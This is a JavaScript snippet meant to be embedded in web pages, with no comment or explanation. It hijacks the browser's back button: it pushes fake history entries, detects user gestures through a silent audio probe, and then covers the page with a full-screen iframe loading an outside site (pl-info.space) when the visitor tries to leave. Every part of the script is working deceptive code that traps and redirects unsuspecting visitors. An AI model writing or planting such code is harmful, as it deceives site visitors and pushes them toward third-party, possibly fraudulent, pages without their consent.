(function () {
    var redFlag = false;

    document.addEventListener("DOMContentLoaded", function () {
        var links = document.getElementsByTagName('a');

        for (var i = 0; i < links.length; i++) {
            links[i].addEventListener("click", function () {
                redFlag = true;
            });
        }
        
        backInFrame(replaceMacros('https://pl-info.space'));
    });

    function replaceMacros(backLink) {
        const DefaultMacroValue = '',
            regExp = /\[(.+?)]/g;

        try {
            var url = new URL(location.href);

            backLink = backLink.replace(regExp, function (all, key) {
                if (url.searchParams.has(key)) {
                    return url.searchParams.get(key);
                }
                return DefaultMacroValue;
            });

            return backLink;
        } catch (err) {
            console.error(err);
            return backLink;
        }
    }

    function backInFrame(backLink) {
        var frame = document.createElement('iframe');
        frame.style.width = '100%';
        frame.id = 'domonet';
        frame.name = 'domonet';
        frame.style.height = '100vh';
        frame.style.position = 'fixed';
        frame.style.top = 0;
        frame.style.left = 0;
        frame.style.border = 'none';
        frame.style.zIndex = 999997;
        frame.style.display = 'none';
        frame.style.backgroundColor = '#fff';
        document.body.append(frame);

        for (var t = 0; 2 > t; ++t) window.history.pushState({}, '', window.location.href + '#' + t);

        if (!isIos()) {
            checkUserGesture(function () {
                for (var t = 0; 2 > t; ++t) window.history.pushState({}, '', window.location.href + '#' + t);
            });
        }

        window.onpopstate = function (t) {
            setTimeout(
                function () {
                    if (redFlag === true) {
                        redFlag = false;
                        return;
                    }

                    if (getUrlVar('frame') === 1 || isInIframe()) return;

                    if (!isIos() && !!!t.state) return;

                    document.body.style.overflow = 'hidden';
                    frame.style.display = "block";
                                                            document.querySelectorAll("body > *:not(#domonet)").forEach(function (e) {
                        e.setAttribute('style', 'display:none;');
                    });

                    frames['domonet'].window.location.replace(backLink);
                },
                10
            );
        };
    }

    function getUrlVar(key) {
        var p = window.location.search;
        p = p.match(new RegExp('[?&]{1}(?:' + key + '=([^&$#=]+))'));
        return p ? p[1] : '';
    }

    function isInIframe() {
        try {
            return window != window.top || document != top.document || self.location != top.location;
        } catch (e) {
            return true;
        }
    }

    function checkUserGesture(callback) {
        var st = setInterval(function () {
            var audio = document.createElement('audio');
            var playPromise = audio.play();
            if (playPromise instanceof Promise) {
                if (!audio.paused) {
                    clearInterval(st);
                    callback();
                }
                playPromise.then(function (e) {

                }).catch(function (error) {

                });
            } else {
                if (!audio.paused) {
                    clearInterval(st);
                    callback();
                }
            }
        }, 100);
    }

    function isIos() {
        return [
            'iPad Simulator',
            'iPhone Simulator',
            'iPod Simulator',
            'iPad',
            'iPhone',
            'iPod',
            'Macintosh',
            'MacIntel',
            'MacPPC',
            'Mac68K',
            'Mac68K'
        ].indexOf(navigator.platform) !== -1;
    }
})(window);